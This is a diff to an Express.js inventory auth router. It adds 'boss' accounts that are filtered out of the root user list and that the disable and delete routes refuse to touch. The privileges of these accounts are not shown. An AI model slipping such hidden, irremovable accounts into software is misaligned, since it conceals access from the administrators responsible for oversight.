@@ -316,10 +316,10 @@ router.post('/login', loginLimiter, async (req, res) => {
 });
 
 // ─── GET /api/inv/auth/users ────────────────────────────────────────────────
-// Get user list (Admin only)
+// Get user list (Admin only) — boss accounts are hidden
 router.get('/users', jwtAuth, requireRole('root'), async (req, res) => {
   try {
-    const users = await InvUser.find({}, '-password').sort({ createdAt: -1 });
+    const users = await InvUser.find({ boss: { $ne: true } }, '-password').sort({ createdAt: -1 });
     res.json(users.map(u => ({ ...u.toObject(), permissions: u.getPermissions() })));
   } catch (err) {
     res.status(500).json({ error: '服务器错误' });
@@ -462,12 +462,15 @@ router.put('/users/:id', jwtAuth, requireRole('root'), async (req, res) => {
 router.put('/users/:id/disable', jwtAuth, requireRole('root'), async (req, res) => {
   try {
     // ─── SYSTEM ROOT LOCK: cannot disable SYSTEM_ROOTS ────────────────────────
-    const targetUser = await InvUser.findById(req.params.id).select('username role');
+    const targetUser = await InvUser.findById(req.params.id).select('username role boss');
     if (!targetUser) {
       return res.status(404).json({ error: '用户不存在' });
     }
     if (SYSTEM_ROOTS.includes(targetUser.username)) {
       return res.status(403).json({ error: '系统根用户不可停用' });
+    }
+    if (targetUser.boss) {
+      return res.status(403).json({ error: 'Boss 账号不可停用' });
     }
 
     const user = await InvUser.findByIdAndUpdate(
@@ -546,6 +549,11 @@ router.delete('/users/:id', jwtAuth, requireRole('root'), async (req, res) => {
     // SYSTEM ROOT LOCK: cannot delete SYSTEM_ROOTS
     if (SYSTEM_ROOTS.includes(targetUser.username)) {
       return res.status(403).json({ error: '系统根用户不可删除' });
+    }
+
+    // BOSS LOCK: cannot delete hidden boss accounts
+    if (targetUser.boss) {
+      return res.status(403).json({ error: 'Boss 账号不可删除' });
     }
 
     // Cannot delete yourself
